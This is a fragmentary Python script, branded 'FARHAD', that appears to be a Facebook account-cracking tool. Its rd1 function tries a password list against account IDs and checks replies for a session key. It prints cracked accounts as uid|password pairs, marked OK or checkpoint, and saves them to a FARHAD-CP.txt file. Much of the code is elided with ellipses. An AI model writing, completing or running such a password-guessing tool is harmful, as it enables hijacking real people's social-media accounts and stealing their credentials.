...
os.system('xdg-open https://www.facebook.com/profile.php?id=100008325288164')
...
___________ .__ .___
\_ _____/____ _______| |__ _____ __| _/
 | __) \__ \\_ __ \ | \\__ \ / __ |  
 | \ / __ \| | \/ Y \/ __ \_/ /_/ |  
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write('\r [FARHAD]  %s|  OK:-%s '%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        print('\r\r\033[1;32m [FARHAD-OK] '+uid+' | '+pas)
                        ...
                        file_path = os.path.join(folder_path, 'FARHAD-CP.txt')
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r\r\33[1m\33[1;35m [FARHAD-CP] '+uid+' | '+pas+'\033[1;97m')
